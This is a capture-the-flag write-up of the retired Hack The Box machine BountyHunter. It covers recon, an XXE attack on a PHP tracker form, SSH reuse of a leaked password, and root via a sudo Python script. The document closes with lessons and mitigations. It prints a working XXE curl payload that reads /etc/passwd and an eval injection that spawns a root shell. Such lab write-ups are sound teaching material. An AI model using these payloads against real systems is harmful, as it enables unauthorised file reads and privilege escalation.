---
machine: BountyHunter
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, python, sudo]
---

# BountyHunter — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The report-tracking form parses XML with external entities enabled. XXE reads host files, including the PHP source with the `development` password; SSH access leads to a Python ticket script run with `sudo` that evaluates user input and yields root command execution.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Ports: `22/tcp` SSH and `80/tcp` HTTP.
- Services: Apache hosting a PHP bug-bounty portal; SSH for the `development` user.
- Technologies: PHP, Apache, XML, SQLite/MySQL and a Python script run with `sudo`.

## Enumeration

- Vhost `bountyhunter.htb` and the `log_submit.php` form.
- `tracker_diRbPr00f314.php` accepts a base64-encoded `data` parameter.
- XXE reads `db.php` and `/etc/passwd`.
- System user: `development`.

## Foothold

Send XML with an external entity pointing at `file:///etc/passwd`, then at `db.php`. The tracker reflects the file contents; the recovered password is reused over SSH.

```bash
PAYLOAD='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><data>&x;</data></r>'
curl -s http://bountyhunter.htb/tracker_diRbPr00f314.php \
  --data-urlencode "data=$(printf %s "$PAYLOAD" | base64 -w0)"
ssh development@bountyhunter.htb
```

## Lateral movement

There is no second host: the pivot is from the web application to the system user through the password read from `db.php`.

## Privilege escalation

`sudo -l` allows `internals.py` as root. The script builds a ticket and passes it to `eval`; inject a Python expression that spawns a shell.

```bash
sudo -l
sudo /usr/bin/python3 /opt/skytrain_inc/internals.py
# In the ticket field:
__import__("os").system("/bin/bash")
```

## Evidence

- Tracker response containing `/etc/passwd` and `db.php`.
- SSH access as `development`.
- `sudo -l` output and root prompt after injection.

## Lessons learned

- A safe XML parser must disable DTDs and external entities.
- Secrets in PHP source readable by the web server leak through XXE.
- `eval` on user data turns a privileged script into RCE.

## Mitigation and detection

- Disable external entities and DTDs in the parser.
- Rotate credentials and do not reuse the database password for SSH.
- Replace `eval` with a data parser and run the script with least privilege.

## References

- [0xdf — BountyHunter](https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html)
- [IppSec — BountyHunter](https://www.youtube.com/watch?v=5axsDhumfhU)
- [Hack The Box — BountyHunter](https://app.hackthebox.com/machines/bountyhunter)
